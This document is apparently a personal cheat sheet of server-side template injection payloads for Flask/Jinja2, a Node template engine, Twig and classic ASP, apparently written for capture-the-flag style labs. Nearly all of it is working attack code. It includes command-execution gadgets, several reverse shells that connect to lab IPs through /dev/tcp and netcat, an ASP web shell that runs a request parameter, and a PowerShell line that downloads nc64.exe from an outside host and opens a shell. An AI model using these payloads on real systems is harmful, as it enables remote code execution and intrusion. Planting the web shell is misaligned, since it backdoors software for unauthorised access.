
**Testing**
```
<%=“testing execution” %>
<% Response.Write("testing execution") %>
${{<%[%""]}}%\.
```

## Flask Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
`echo -n 'sh -i >& /dev/tcp/10.10.14.11/443 0>&1' | base64`
```
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "BASE64" |base64 -d| bash').read() }}   (bash / sh)
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}BASE64${IFS}|base64${IFS}-d|bash').read()}}
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f~')\")()}}
```


## Twig Payloads
```
{{['id']|filter('system')}}
{{['bash -c "bash -i >& /dev/tcp/10.10.14.23/7788 0>&1"']|filter('system')}}
```

## ASP Payload (windows)
```
<% 
Set shell = CreateObject("WScript.Shell") 
Set proc = shell.exec("whoami") 
Response.Write(proc.StdOut.ReadAll) 
%>


<% 
Set shell = CreateObject("WScript.Shell") 
Set proc = shell.exec(request("cmd")) 
Response.Write(proc.StdOut.ReadAll) 
%>
(提交后访问 ?cmd=whoami)

<% 
Set shell = CreateObject("WScript.Shell") 
Set proc = shell.exec("powershell -c curl -outfile C:\nc64.exe http://10.10.14.6/nc64.exe; C:\nc64.exe -e powershell 10.10.14.6 444") 
Response.Write(proc.StdOut.ReadAll) 
%>
```